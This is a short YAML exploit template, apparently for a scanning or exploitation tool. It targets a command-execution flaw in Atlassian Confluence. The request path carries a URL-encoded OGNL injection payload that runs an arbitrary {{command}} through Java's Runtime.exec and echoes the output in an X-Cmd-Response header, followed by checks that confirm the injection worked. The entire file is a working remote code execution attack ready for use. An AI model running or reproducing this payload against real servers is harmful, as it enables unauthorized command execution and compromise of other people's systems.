info:
  vulId: confluence_rce
  detail: atlassian confluence命令执行漏洞
  fofaQuery: sasa
  expType: command
rules:
  - request:
      path: "{{rootUrl}}/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22{{command}}%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/"
      method: GET
      headers:
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36
        Content-type: application/x-www-form-urlencoded
      redirect: false
      dataType: text
    checksCondition: and
    checks:
      - checkType: regex
        desireds:
          - "X-Cmd-Response: (.*?)\\n"
        place: headers
        condition: and

      - checkType: status
        desireds:
          - 302
        condition: and